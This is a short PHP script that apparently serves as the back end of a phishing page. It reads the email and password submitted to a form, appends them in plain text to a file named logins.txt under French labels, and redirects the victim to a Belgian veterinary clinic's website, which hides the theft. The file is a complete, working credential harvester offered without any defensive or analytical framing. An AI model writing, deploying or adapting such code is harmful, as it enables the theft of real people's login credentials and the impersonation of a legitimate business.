<?php
$username = $_POST['email'];
$password = $_POST['password'];

$file = fopen("logins.txt", "a+");
fwrite($file, "Nom d'utilisateur : " . $username . " - Mot de passe : " . $password . "\n");
fclose($file);

header("Location: https://www.veterinaire-donckers.be/");
exit();
?>
